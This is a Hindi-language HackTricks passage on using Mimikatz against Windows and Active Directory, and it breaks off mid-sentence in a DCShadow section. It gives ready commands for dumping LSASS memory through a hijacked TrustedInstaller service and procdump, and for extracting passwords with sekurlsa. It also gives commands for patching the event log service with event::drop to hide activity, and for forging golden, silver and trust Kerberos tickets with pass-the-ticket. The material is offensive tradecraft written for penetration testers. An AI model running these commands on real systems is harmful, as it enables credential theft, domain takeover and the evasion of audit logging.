# Mimikatz

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित देखना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का एक्सेस चाहिए**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड ग्रुप**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम ग्रुप**](https://t.me/peass) या **मुझे** ट्विटर पर **फॉलो** करें 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो** (https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को PRs सबमिट करके**.

</details>

**यह पृष्ठ [adsecurity.org](https://adsecurity.org/?page\_id=1821) से आधारित है।** अधिक जानकारी के लिए मूल चेक करें!

## LM और Clear-Text में मेमोरी

Windows 8.1 और Windows Server 2012 R2 से आगे, credential चोरी से बचाव के लिए महत्वपूर्ण उपाय लागू किए गए हैं:

- **LM hashes और plain-text passwords** को सुरक्षा बढ़ाने के लिए मेमोरी में अब नहीं रखा जाता है। एक विशेष रजिस्ट्री सेटिंग, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ को एक DWORD मान `0` के साथ कॉन्फ़िगर करना होगा ताकि Digest Authentication को अक्षम करें, यह सुनिश्चित करता है कि "clear-text" passwords LSASS में कैश नहीं होते हैं।

- **LSA Protection** को प्रावधान किया गया है ताकि अनधिकृत मेमोरी पढ़ने और कोड इंजेक्शन से सुरक्षा प्राधान किया जा सके। इसे LSASS को एक संरक्षित प्रक्रिया के रूप में चिह्नित करके प्राप्त किया जाता है। LSA Protection को सक्रिय करने के लिए:
1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ पर रजिस्ट्री को संशोधित करके `RunAsPPL` को `dword:00000001` पर सेट करना।
2. एक समूह नीति वस्तु (GPO) को लागू करना जो प्रबंधित उपकरणों पर इस रजिस्ट्री परिवर्तन को प्रवर्तित करती है।

इन सुरक्षाओं के बावजूद, Mimikatz जैसे उपकरण LSA Protection को निषेधित कर सकते हैं विशेष ड्राइवर्स का उपयोग करके, हालांकि ऐसे कार्रवाई का संभावना है कि इवेंट लॉग में दर्ज किया जाए।

### SeDebugPrivilege Removal का विरोध करना

सामान्यत: SeDebugPrivilege होता है, जो प्रोग्रामों को debug करने की अनुमति देता है। इस विशेषाधिकार को अनधिकृत मेमोरी डंप्स को रोकने के लिए प्रतिबंधित किया जा सकता है, जो हमलावरों द्वारा credential को मेमोरी से निकालने के लिए एक सामान्य तकनीक है। हालांकि, इस विशेषाधिकार को हटाने के बावजूद, TrustedInstaller खाता एक अनुकूलित सेवा कॉन्फ़िगरेशन का उपयोग करके मेमोरी डंप्स कर सकता है:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
यह `lsass.exe` मेमोरी को एक फ़ाइल में डंप करने की अनुमति देता है, जिसे फिर दूसरे सिस्टम पर विश्लेषित किया जा सकता है ताकि क्रेडेंशियल्स निकाले जा सकें:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz विकल्प

Mimikatz में घटना लॉग टैंपरिंग में दो मुख्य क्रियाएँ शामिल हैं: घटना लॉग साफ करना और नए घटनाओं का लॉगिंग रोकने के लिए ईवेंट सेवा को पैच करना। नीचे इन क्रियाओं को करने के लिए कमांड हैं:

#### घटना लॉग साफ करना

- **कमांड**: यह क्रिया घटना लॉग को हटाने का लक्ष्य रखती है, जिससे दुष्ट गतिविधियों को ट्रैक करना कठिन हो जाता है।
- Mimikatz अपने मानक दस्तावेज़ में सीधा कमांड प्रदान नहीं करता है जिससे इसके कमांड लाइन के माध्यम से घटना लॉग को सीधे हटाया जा सके। हालांकि, घटना लॉग मेनिपुलेशन आम तौर पर Mimikatz के बाहर सिस्टम टूल्स या स्क्रिप्ट का उपयोग करके विशेष लॉग को साफ करने में शामिल होता है (जैसे, PowerShell या Windows ईवेंट व्यूअर का उपयोग करके)।

#### प्रयोगात्मक सुविधा: ईवेंट सेवा को पैच करना

- **कमांड**: `event::drop`
- यह प्रयोगात्मक कमांड ईवेंट लॉगिंग सेवा के व्यवहार को संशोधित करने के लिए डिज़ाइन किया गया है, जिससे नए घटनों को रिकॉर्ड करने से रोका जा सके।
- उदाहरण: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` कमांड सुनिश्चित करता है कि Mimikatz आवश्यक विशेषाधिकारों के साथ सिस्टम सेवाओं को संशोधित करे।
- `event::drop` कमांड फिर ईवेंट लॉगिंग सेवा को पैच करता है।


### कर्बेरोस टिकट हमले

### गोल्डन टिकट निर्माण

गोल्डन टिकट डोमेन-व्यापी पहुंच अनुकरण की अनुमति देता है। मुख्य कमांड और पैरामीटर:

- कमांड: `kerberos::golden`
- पैरामीटर:
- `/domain`: डोमेन का नाम।
- `/sid`: डोमेन का सुरक्षा पहचानकर्ता (SID)।
- `/user`: अनुकरण करने के लिए उपयोगकर्ता नाम।
- `/krbtgt`: डोमेन के KDC सेवा खाते का NTLM हैश।
- `/ptt`: सीधे टिकट को मेमोरी में इंजेक्ट करता है।
- `/ticket`: बाद में उपयोग के लिए टिकट सहेजता है।

उदाहरण:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### सिल्वर टिकट निर्माण

सिल्वर टिकट विशिष्ट सेवाओं तक पहुंचने की अनुमति देते हैं। मुख्य कमांड और पैरामीटर:

- कमांड: गोल्डन टिकट के समान है लेकिन विशिष्ट सेवाओं को लक्षित करता ह।
- पैरामीटर:
- `/service`: लक्षित सेवा (जैसे, cifs, http)।
- गोल्डन टिकट के समान अन्य पैरामीटर।

उदाहरण:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### विश्वास टिकट निर्माण

विश्वास टिकट को विश्वास संबंधों का उपयोग करके डोमेन के अधिकारों तक पहुंचने के लिए उपयोग किया जाता है। मुख्य कमांड और पैरामीटर:

- कमांड: गोल्डन टिकट के समान, लेकिन विश्वास संबंधों के लिए।
- पैरामीटर:
- `/target`: लक्ष्य डोमेन का FQDN।
- `/rc4`: विश्वास खाते के एनटीएलएम हैश।

उदाहरण:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### अतिरिक्त कर्बेरोस कमांड

- **टिकट सूचीकरण**:
- कमांड: `kerberos::list`
- वर्तमान उपयोगकर्ता सत्र के लिए सभी कर्बेरोस टिकट सूचीबद्ध करता है।

- **कैश पास**:
- कमांड: `kerberos::ptc`
- कैश फ़ाइल से कर्बेरोस टिकट इंजेक्ट करता है।
- उदाहरण: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **टिकट पास**:
- कमांड: `kerberos::ptt`
- एक अन्य सत्र में कर्बेरोस टिकट का उपयोग करने देता है।
- उदाहरण: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **टिकट सफाई**:
- कमांड: `kerberos::purge`
- सत्र से सभी कर्बेरोस टिकट साफ करता है।
- संघर्ष से बचने के लिए टिकट मानिपुलेशन कमांड का उपयोग करने से पहले उपयोगी है।


### सक्रिय निर्देशिका दुरुपयोग

- **DCShadow**: एक मशीन को अस्थायी रूप से एक डीसी के रूप में काम करने के लिए एडी ऑब्ज
